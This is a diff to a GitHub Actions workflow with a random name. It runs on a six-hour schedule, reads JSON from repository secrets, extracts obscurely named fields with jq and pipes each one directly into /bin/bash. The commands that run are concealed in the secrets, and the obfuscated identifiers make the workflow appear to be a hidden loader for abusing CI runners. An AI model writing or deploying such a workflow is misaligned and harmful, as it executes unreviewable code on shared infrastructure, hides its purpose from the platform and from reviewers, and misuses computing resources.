@@ -2,21 +2,30 @@ name: harmoniouswritten
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
+    - cron: '17 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: harmoniouswritten
         env:
-          lyqc7243: ${{ secrets.lyqc7243 }}
+          cc0: ${{ secrets.cc0 }}
         run: |
-          echo $lyqc7243 | jq -r .zns87 | /bin/bash
-          echo $lrmua659 | jq -r .ei292 | /bin/bash
-          echo $fqu187 | jq -r .dor274 | /bin/bash
-          echo $ybdt8082 | jq -r .d0696 | /bin/bash
-          echo $juvj9 | jq -r .iutwv229 | /bin/bash
-          echo $t5 | jq -r .rxw865 | /bin/bash
+          echo $cc0 | jq -r .ibje41804 | /bin/bash
+          echo $vvpo410 | jq -r .mrhbf6 | /bin/bash
+          echo $nucd776 | jq -r .tbd199 | /bin/bash
+          echo $n08 | jq -r .sroh80596 | /bin/bash
+          echo $o9209 | jq -r .dcidr2135 | /bin/bash
+          echo $bzq57 | jq -r .jivy05063 | /bin/bash
+          echo $ffqt661 | jq -r .tt527 | /bin/bash
+          echo $g870 | jq -r .yc9714 | /bin/bash
+          echo $qcwy806 | jq -r .yc553 | /bin/bash
+          echo $hsr397 | jq -r .u4 | /bin/bash
+          echo $kup877 | jq -r .tp5 | /bin/bash
+          echo $rtw12500 | jq -r .tiko80221 | /bin/bash
+          echo $nye31 | jq -r .wvjyk07 | /bin/bash
+          echo $v8 | jq -r .rb522 | /bin/bash
 
